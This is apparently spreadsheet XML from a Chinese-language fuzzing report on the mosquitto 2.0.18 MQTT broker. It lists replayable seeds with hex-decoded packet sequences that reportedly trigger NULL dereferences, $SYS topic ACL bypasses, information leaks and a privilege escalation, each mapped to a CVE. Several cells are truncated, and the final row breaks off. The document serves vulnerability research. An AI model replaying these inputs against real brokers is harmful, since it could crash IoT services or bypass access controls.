        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 868B (报告+请求数据)\u000a请求数据: 178B\u000a\u000a---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MQTT请求序列(178B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=131 Topics=[''(零长度!QoS=0)] | raw_header=822a0083000000210001740a001d2453\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=99B | raw_header=357a00152473686172652f6772702f74\u000aMsg[3]: (不完整,10B) raw=f6e300016eeaff0001cd\u000a(尾部10B): f6e300016eeaff0001cd</f>
        <v/>
      </c>
      <c r="F5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78" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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7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79">
      <c r="A579" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B579" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C579" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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79" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 915B (报告+请求数据)\u000a请求数据: 80B\u000a\u000a---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MQTT请求序列(80B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0500\u000aMsg[2]: TYPE0  | raw_header=0100\u000aMsg[3]: SUBSCRIBE PacketID=151 Topics=[''(零长度!QoS=0)] | raw_header=82050097000000\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=45B | raw_header=39420013245359532f62726f6b65722f\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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7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0">
      <c r="A580" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:00ca</t>
        </is>
      </c>
      <c r="B580" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C580" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:00ca)中的REQUEST DATA提取出来(466B)\u000a4.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0x00ca\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E580" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00ca ===\u000a大小: 3364B (报告+请求数据)\u000a请求数据: 466B\u000a\u000a---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MQTT请求序列(466B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a2160011001173656e736f3c00076675\u000aMsg[2]: TYPE0  | raw_header=00122473686172652f677270312f7465\u000aMsg[3]: TYPE0  | raw_header=0200\u000aMsg[4]: TYPE0  | raw_header=01230000122473686172652f67727031\u000aMsg[5]: CONNACK session_present=116 reason_code=101 | raw_header=2b2f74656d703017001173656e736f72\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=313411000c636d642f6c696768742f6f\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=122473686172652f67727031000c656d\u000aMsg[8]: PUBREL PacketID=26740 | raw_header=696768742f6f7a5f6336823012201224\u000aMsg[9]: SUBSCRIBE PacketID=19456 Topics=[''(零长度!QoS=0)] | raw_header=8c674c00000080a426d0895db6e02255\u000aMsg[10]: (不完整,32B) raw=696768742f6f6e0006000c636d642f6c696768742f6f6e00063150020006e000\u000a(尾部32B): 696768742f6f6e0006000c636d642f6c696768742f6f6e00063150020006e000</f>
        <v/>
      </c>
      <c r="F5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8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80" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J58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8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81">
      <c r="A581" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B581" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C581" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1446B)\u000a4.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81" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 1976B (报告+请求数据)\u000a请求数据: 1446B\u000a\u000a---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MQTT请求序列(1446B原始二进制) ---\u000aMsg[1]: (不完整,1446B) raw=85821800000000000000000000000000000000000000000000000000000000000000000000000000\u000a(尾部1446B): 8582180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J58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82">
      <c r="A582" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B582" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C582" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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82" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 814B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a---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MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=82120001000010656e736f722f2b2f2b\u000aMsg[2]: (不完整,70B) raw=54540406003c0009636c69656e745f3031007a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a\u000a(尾部70B): 54540406003c0009636c69656e745f3031007a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a01581410001b744d</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J58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83">
      <c r="A583" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B583" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C583" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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583" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0142 ===\u000a大小: 753B (报告+请求数据)\u000a请求数据: 79B\u000a\u000a---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MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3038 Topics=['test/topic'(QoS=2), ''(零长度!QoS=2), '$share/grp1/#'(QoS=1)] | raw_header=82220bde000a746573742f746f706963\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='M\x82/©·¬±ï\x9a$ë\x14ß3\x88\x90\x16\x85\x9d' | raw_header=38280013245359532f62726f6b65722f\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=ee</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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8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4">
      <c r="A584" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B584" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C584" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(154B)\u000a4.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84" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 1025B (报告+请求数据)\u000a请求数据: 154B\u000a\u000a---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MQTT请求序列(154B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2534 Topics=[''(零长度!QoS=2)] | raw_header=821809e6000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=102B | raw_header=327b0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=643477\u000a(尾部3B): 643477</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5">
      <c r="A585" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B585" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C585" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(122B)\u000a4.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585" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c0 ===\u000a大小: 838B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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MQTT请求序列(122B原始二进制) ---\u000aMsg[1]: SUBSCRIBE  | raw_header=828000\u000aMsg[2]: TYPE0  | raw_header=0a00\u000aMsg[3]: SUBSCRIBE PacketID=3681 Topics=[''(零长度!QoS=1), '$share/g3/home/+/temperature'(QoS=1)] | raw_header=82240e61000001001c2473686172652f\u000aMsg[4]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=0 retain=True payload='Y/¾R\x1a\«:W\x8c¹' | raw_header=3938002b766572792f646565702f746f\u000aMsg[5]: (不完整,21B) raw=13612f622f632f642f652f662f672f682f692f6a00\u000a(尾部21B): 13612f622f632f642f652f662f672f682f692f6a00</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J58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86">
      <c r="A586" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B586" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C586" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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86" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 1095B (报告+请求数据)\u000a请求数据: 183B\u000a\u000a---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MQTT请求序列(183B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: SUBSCRIBE PacketID=215 Topics=[''(零长度!QoS=1)] | raw_header=823d00d7000009612f622f632f642f65\u000aMsg[3]: PUBLISH Topic='sensor/temp' QoS=0 retain=True payload_len=94B | raw_header=396b000b73656e736f722f74656d7034\u000aMsg[4]: (不完整,9B) raw=00405304ffffff0136\u000a(尾部9B): 00405304ffffff0136</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J58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87">
      <c r="A587" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B587" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C587" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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587" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c2 ===\u000a大小: 945B (报告+请求数据)\u000a请求数据: 84B\u000a\u000a---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MQTT请求序列(84B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0100\u000aMsg[2]: SUBSCRIBE PacketID=3721 Topics=[''(零长度!QoS=0), 'test/topic'(QoS=0)] | raw_header=82120e89000000000a746573742f746f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload='\x0e\x8a4çuÒrQÆ°«²]ÑZ5~T8r)¼ms\x0fýÐ\x87FóðºÔ$¡' | raw_header=3b380013245359532f62726f6b65722f\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: (不完整,2B) raw=00f7\u000a(尾部2B): 00f7</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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8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8">
      <c r="A588" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B588" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C588" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(225B)\u000a4.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88" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1283B (报告+请求数据)\u000a请求数据: 225B\u000a\u000a---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MQTT请求序列(225B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=208 Topics=[''(零长度!QoS=1)] | raw_header=823900d000000d2473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=85B | raw_header=3374001d245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=821200014d5154540402003c00076375\u000aMsg[4]: (不完整,28B) raw=33930b00010006746573742f23026202001462020000146202026800\u000a(尾部28B): 33930b00010006746573742f23026202001462020000146202026800</f>
        <v/>
      </c>
      <c r="F5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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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8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89">
      <c r="A589" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B589" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C589" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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589" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 853B (报告+请求数据)\u000a请求数据: 25B\u000a\u000a---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MQTT请求序列(25B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=153 Topics=['$share/grp1/#'(QoS=2), ''(零长度!QoS=1)] | raw_header=82150099000d2473686172652f677270\u000aMsg[2]: (不完整,2B) raw=e1ff\u000a(尾部2B): e1ff</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J58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8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0">
      <c r="A590" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B590" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C590" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(723B)\u000a4.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0x0246\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E590" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 1593B (报告+请求数据)\u000a请求数据: 723B\u000a\u000a---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MQTT请求序列(723B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=13050 Topics=[''(零长度!QoS=2)] | raw_header=8d7032fa0000fa050505057fff050505\u000aMsg[2]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[3]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[4]: PUBREL PacketID=27909 | raw_header=6d6d6d0505f30405642f6c69670ee0e4\u000aMsg[5]: PUBREL PacketID=28013 | raw_header=6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d\u000aMsg[6]: (不完整,165B) raw=76d36a499745869582a1bea176deff68f94edf6d26d1043ae8862f507222a1e8f60b328d50b8226d\u000a(尾部165B): 76d36a499745869582a1bea176deff68f94edf6d26d1043ae8862f507222a1e8f60b328d50b8226d6d6d6d6d6d6d6d0505f3</f>
        <v/>
      </c>
      <c r="F5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9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90" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J59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59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91">
      <c r="A591" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:024e</t>
        </is>
      </c>
      <c r="B591" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C591" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:024e)中的REQUEST DATA提取出来(1229B)\u000a4.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Sev4\u000a- 违规类别代码: 0x024e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E591" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:024e ===\u000a大小: 5250B (报告+请求数据)\u000a请求数据: 1229B\u000a\u000a---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MQTT请求序列(1229B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=32 Topics=[''(零长度!QoS=1)] | raw_header=821600200000b9c7ea77aa8c00c22063\u000aMsg[2]: PUBCOMP PacketID=25701 | raw_header=792f646565702f746f65656565656565\u000aMsg[3]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[4]: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raw_header=65656565656565656565656565656565\u000aMsg[8]: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raw_header=656565656565657069632f6c6576656c\u000aMsg[12]: PUBREL PacketID=12140 | raw_header=6c322f6c6576656c332f6c6576656c34\u000aMsg[13]: CONNECT  | raw_header=1b00\u000aMsg[14]: CONNACK session_present=101 reason_code=114 | raw_header=2b766572792f646565702f746f706963\u000aMsg[15]: (不完整,55B) raw=6576656c34131c32c3d9a8b9c7ea77aa8c00c220632c9ab91bada46e0005313411ec0c6364506c69\u000a(尾部55B): 6576656c34131c32c3d9a8b9c7ea77aa8c00c220632c9ab91bada46e0005313411ec0c6364506c696768742f6f6e00063150</f>
        <v/>
      </c>
      <c r="F5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9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91" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J59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9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92">
      <c r="A592" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B592" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C592" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1393B)\u000a4.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592" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 2510B (报告+请求数据)\u000a请求数据: 1393B\u000a\u000a---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CVE=CVE-2019-5432)\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(1393B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1000\u000aMsg[2]: PUBACK PacketID=13312 | raw_header=4e473400044d51545f6332820b000200\u000aMsg[3]: PUBCOMP PacketID=5888 | raw_header=703017001173656e736f722f726f6f6d\u000aMsg[4]: AUTH  | raw_header=ff2f2b2f74656d706572617475726500\u000aMsg[5]: TYPE0  | raw_header=000a776f726c645002000a62\u000aMsg[6]: TYPE0  | raw_header=0200\u000aMsg[7]: TYPE0  | raw_header=0a7002000ae000a2110002000d73656e\u000aMsg[8]: PUBREL PacketID=12140 | raw_header=6c332f6c6576656c34010009612f622f\u000aMsg[9]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=0)] | raw_header=820b00020000746573742f2301\u000aMsg[10]: PUBLISH Topic='test/b' QoS=2 retain=False payload='\x00\x02world' | raw_header=340f0006746573742f620002776f726c\u000aMsg[11]: PUBREC PacketID=10 | raw_header=5002000a\u000aMsg[12]: PUBREL PacketID=10 | raw_header=6202000a\u000aMsg[13]: PUBCOMP PacketID=10 | raw_header=7002000a\u000aMsg[14]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[15]: UNSUBSCRIBE  | raw_header=a2110002000d73656e736f722f2b2f74\u000aMsg[16]: PUBLISH Topic='sensor/rooml2/lev' QoS=0 retain=False payload='el3/' | raw_header=3017001173656e736f722f726f6f6d6c\u000aMsg[17]: PUBREL PacketID=30309 | raw_header=6c6576657f70010009612f62f8632f64\u000aMsg[18]: PUBCOMP PacketID=29231 | raw_header=736f722f2b2f74656d70301700117365\u000aMsg[19]: PUBREL PacketID=62511 | raw_header=6768f42f6f6e00052626262626262626\u000aMsg[20]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1173656e736f722f726f6f6d6c322f6c\u000aMsg[21]: PUBCOMP PacketID=29184 | raw_header=736572000966757a746573742f3cc000\u000aMsg[22]: PUBREL PacketID=25964 | raw_header=6576656c332f6c6576656c3401000961\u000aMsg[23]: CONNECT  | raw_header=1700\u000aMsg[24]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1173656e736f722f726f6f6d6c3f086c\u000aMsg[25]: CONNECT  | raw_header=1100\u000a(尾部167B): 02000d73656e736f722f2b2f74656d703017001173656e736f722f726f6f6d312f74656d7032322e353211000c636d642f6c</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J59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9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3">
      <c r="A593" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B593" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C593" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(420B)\u000a4.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593" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1656B (报告+请求数据)\u000a请求数据: 420B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: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MQTT请求序列(420B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/up|!ÿÿ' QoS=2 retain=False payload=''\x0fÿÿÿ"' | raw_header=341a0012245359532f62726f6b65722f\u000aMsg[2]: SUBSCRIBE PacketID=474 Topics=[''(零长度!QoS=1)] | raw_header=822a01da000001742800012324001c24\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=122B | raw_header=399901001d245359532f62726f6b6572\u000aMsg[4]: TYPE0  | raw_header=000a1900170126000d6d6266\u000aMsg[5]: PUBCOMP PacketID=31333 | raw_header=757a7a65725f73796e6300027635001d\u000aMsg[6]: (不完整,56B) raw=6d652f2b2f73746174757302301600146465766963652f2b2f74656c656d657472792f23c000e010\u000a(尾部56B): 6d652f2b2f73746174757302301600146465766963652f2b2f74656c656d657472792f23c000e010000e11000000001f0006</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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9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594">
      <c r="A594" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:02ce</t>
        </is>
      </c>
      <c r="B594" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C594" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:02ce)中的REQUEST DATA提取出来(2062B)\u000a4.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0x02ce\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E594" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02ce ===\u000a大小: 7307B (报告+请求数据)\u000a请求数据: 2062B\u000a\u000a---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MQTT请求序列(2062B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=17625 Topics=[''(零长度!QoS=3)] | raw_header=821044d900007f656e6f6f101074656d\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737374e37\u000aMsg[3]: PUBLISH  | raw_header=3700\u000aMsg[4]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[5]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737363737373737373737373737\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737377fff373737373737373737\u000aMsg[9]: CONNACK session_present=111 reason_code=112 | raw_header=2f746f706963000b77696c6c5f76355f\u000aMsg[10]: PUBLISH  | raw_header=3500\u000aMsg[11]: TYPE0  | raw_header=09636c69656e745f30312a1800000000\u000aMsg[12]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[13]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[14]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[15]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[16]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[17]: PUBACK PacketID=14135 | raw_header=4d373737373737373737373737373737\u000aMsg[18]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[19]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373037\u000aMsg[20]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373734373737373737373737370000\u000aMsg[21]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[22]: PUBLISH Topic='?' QoS=3 retain=True payload='' | 